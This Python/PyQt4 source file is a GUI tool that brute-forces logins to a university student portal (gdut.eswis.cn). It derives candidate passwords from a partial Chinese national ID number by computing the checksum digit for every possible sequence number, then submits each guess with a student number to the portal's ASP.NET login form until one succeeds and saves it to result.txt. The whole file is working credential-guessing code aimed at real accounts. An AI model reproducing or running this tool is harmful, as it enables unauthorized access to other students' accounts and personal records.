# -*- coding: utf-8 -*-
from PyQt4 import QtCore, QtGui
import os
import sys
import re
import urllib
import urllib2
import cookielib
import threading
import time

class UI(QtGui.QWidget):
    xhLabel = 0
    xhLine = 0
    xhExistT = 0
    IDLabel = 0
    IDLine = 0
    IDSex = 0
    IDBtn = 0
    startBtn = 0
    closeBtn = 0
    MessageText = 0
    mainLayout = 0

    threadlist = []
    idList = []
    def __init__(self):
        QtGui.QWidget.__init__(self)
        self.init()
        self.connection()

    def init(self):
        if os.path.exists('data.txt'):
            f = open("data.txt",'r')
            self.idList = f.read().split('\n')
            f.close()
        self.xhLabel = QtGui.QLabel('School ID')
        self.xhLine = QtGui.QLineEdit()
        self.xhLine.setValidator(QtGui.QRegExpValidator(QtCore.QRegExp("[0-9]{1,10}$"),self.xhLine))
        self.xhExistT = QtGui.QLabel()
        self.xhExistT.setFixedWidth(40)
        if len(self.idList) <= 1:
            self.xhExistT.setStyleSheet("background-color: red;")
            self.xhExistT.setText('NO')
        else:
            self.xhExistT.setStyleSheet("background-color: green;")
            self.xhExistT.setText('YES')            
        topLayout = QtGui.QHBoxLayout()
        topLayout.addWidget(self.xhLabel)
        topLayout.addWidget(self.xhLine)
        topLayout.addWidget(self.xhExistT)

        self.IDLabel = QtGui.QLabel('ID card(14)')
        self.IDLine = QtGui.QLineEdit()
        self.IDLine.setValidator(QtGui.QRegExpValidator(QtCore.QRegExp("[0-9]{1,14}$"),self.xhLine))
        self.IDSex = QtGui.QComboBox()
        self.IDSex.addItem("Women")
        self.IDSex.addItem("Man")
        self.IDBtn = QtGui.QPushButton()
        self.IDBtn.setText("Make")
        self.IDBtn.setFixedWidth(40)
        secondLayout = QtGui.QHBoxLayout()
        secondLayout.addWidget(self.IDLabel)
        secondLayout.addWidget(self.IDLine)
        secondLayout.addWidget(self.IDSex)
        secondLayout.addWidget(self.IDBtn)

        self.startBtn = QtGui.QPushButton()
        self.startBtn.setText("Start")
        self.closeBtn = QtGui.QPushButton()
        self.closeBtn.setText("Close")
        thirdLayout = QtGui.QHBoxLayout()
        thirdLayout.addWidget(self.startBtn)
        thirdLayout.addWidget(self.closeBtn)

        self.MessageText = QtGui.QPlainTextEdit()
        self.MessageText.setWindowModified(False)
        self.mainLayout = QtGui.QVBoxLayout()
        self.mainLayout.addLayout(topLayout)
        self.mainLayout.addLayout(secondLayout)
        self.mainLayout.addLayout(thirdLayout)
        self.mainLayout.addWidget(self.MessageText)
        self.setLayout(self.mainLayout)

        self.setFixedWidth(500)
        self.setWindowTitle("XH to ID card NO TOOL")

    def connection(self):
        QtCore.QObject.connect(self.closeBtn,QtCore.SIGNAL('clicked()'),self,QtCore.SLOT('close()'))
        QtCore.QObject.connect(self.IDBtn,QtCore.SIGNAL('clicked()'),self,QtCore.SLOT('IDMAKER()'))
        QtCore.QObject.connect(self.startBtn,QtCore.SIGNAL('clicked()'),self,QtCore.SLOT('TryEvent()'))

    @QtCore.pyqtSlot()
    def IDMAKER(self):
        IDText = str(self.IDLine.text())
        IDList = list(IDText)
        if len(IDList) == 14:
            for i in range(0,len(IDList)):
                IDList.append(int(IDList.pop(0)))
            c = ('1','0','x','9','8','7','6','5','4','3','2')
            w = (7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2)
            r = 0
            for i in range(0,14):
                r = r + IDList[i] * w[i]
            dataFile = open('data.txt','w')
            for row in range(self.IDSex.currentIndex(),1000,2):
                sum = r
                dataFile.write(IDText)
                s = []
                s.append((row/100)%10)
                s.append((row/10)%10)
                s.append(row%10)
                for i in range(0,3):
                    sum = sum + s[i]*w[i+14]
                    dataFile.write(str(s[i]))
                dataFile.write(c[sum%11] + '\n')
                self.idList.append(IDText + str(s[i]) + c[sum%11])
            dataFile.close()
            self.xhExistT.setStyleSheet('background-color: green;')
            self.xhExistT.setText('OK')

    @QtCore.pyqtSlot()
    def TryEvent(self):
        if len(self.threadlist) == 0 and len(self.idList) != 0 and len(str(self.xhLine.text())) == 10:
            thre = threading.Thread(target = self.runThread,args = (str(self.xhLine.text()),self.idList))
            self.threadlist.append(thre)
            thre.start()

    def runThread(self,xh,passwordl):
        while len(passwordl) != 0:
            password = passwordl.pop(0)
            i = eswis(xh,password)
            try:
                i.fetchHTML();
                i.Analyse();
                if(i.Run()):
                    self.MessageText.appendPlainText(i.Password + '.......OK')   
                    f = open('result.txt','w')
                    f.write(i.XH +'--------'+i.Password)
                    f.close()
                    break
                else:
                    self.MessageText.appendPlainText(i.Password + '.......No')
                    #self.emit(QtCore.SIGNAL('updateSignal(QtCore.QString)'),QtCore.QString(i.Password + '.......No'))
                    time.sleep(0.5)
            except Exception:
                self.MessageText.appendPlainText(i.Password + '.......ERROR')


   
        


class eswis:
    url = 'http://gdut.eswis.cn/default.aspx'
    html = ''
    opener = ''
    cookieJ = ''
    headers = ''
    Post = ''
    XH = ''
    Password = ''
    def __init__(self):
        self.cookieJ = cookielib.MozillaCookieJar("tt.txt")
        self.opener =urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookieJ));
        self.headers = {
            'Referer': 'http://gdut.eswis.cn/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win128; x128) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'zh-CN,zh;q=0.8'
            }

    def __init__(self,XH,Password):
        self.XH = XH
        self.Password = Password
        self.cookieJ = cookielib.MozillaCookieJar("tt.txt")
        self.opener =urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookieJ));
        self.headers = {
        'Referer': 'http://gdut.eswis.cn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 21.0; Win128; x128) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'zh-CN,zh;q=0.8'
        }

    def fetchHTML(self):
        myRequest = urllib2.Request(url = self.url,headers = self.headers)
        self.html = self.opener.open(myRequest).read()
        self.cookieJ.save(ignore_discard = True , ignore_expires = True);

    def Analyse(self):
        reg = r'__VIEWSTATE" value="(.*)"'
        _VIEWSTATE = re.findall(re.compile(reg),self.html)
        reg = r'__VIEWSTATEGENERATOR" value="(.*)"'
        _VIEWSTATEGENERATOR = re.findall(re.compile(reg),self.html)
        reg = r'__PREVIOUSPAGE" value="(.*)"'
        _PREVIOUSPAGE = re.findall(re.compile(reg),self.html)
        reg = r'__EVENTVALIDATION" value="(.*)"'
        _EVENTVALIDATION = re.findall(re.compile(reg),self.html)

        _VIEWSTATE = _VIEWSTATE[0];
        _VIEWSTATEGENERATOR = _VIEWSTATEGENERATOR[0]
        _PREVIOUSPAGE = _PREVIOUSPAGE[0]
        _EVENTVALIDATION = _EVENTVALIDATION[0]
        self.Post = self.buildPOST(_VIEWSTATE,_VIEWSTATEGENERATOR,_PREVIOUSPAGE,_EVENTVALIDATION,self.XH,self.Password)

    def buildPOST(self,_VIEWSTATE,_VIEWSTATEGENERATOR,_PREVIOUSPAGE,_EVENTVALIDATION,XH,Password):
        postList = {
            '__EVENTARGUMENT' : '',	
            '__EVENTTARGET' : '',	
            '__EVENTVALIDATION' :  _EVENTVALIDATION,
            '__PREVIOUSPAGE' : _PREVIOUSPAGE,
            '__VIEWSTATE' : _VIEWSTATE,
            '__VIEWSTATEGENERATOR' : _VIEWSTATEGENERATOR,
            'ctl00$dft_page$log_password':	Password,
            'ctl00$dft_page$log_username':	XH,
            'ctl00$dft_page$logon':''	
            }
        return urllib.urlencode(postList)

    def Run(self):
        myRequest = urllib2.Request(self.url,self.Post,self.headers)
        response = self.opener.open(myRequest).read()
        reg = re.compile(r'(ctl00_opt_body)')
        result = re.findall(reg,response)
        if len(result) > 0:
            return True
        else:
            return False

#---------------main-------------
app = QtGui.QApplication(sys.argv)
os.system("mode con cols=20 lines=1 ")
window = UI()
window.show()
sys.exit(app.exec_())
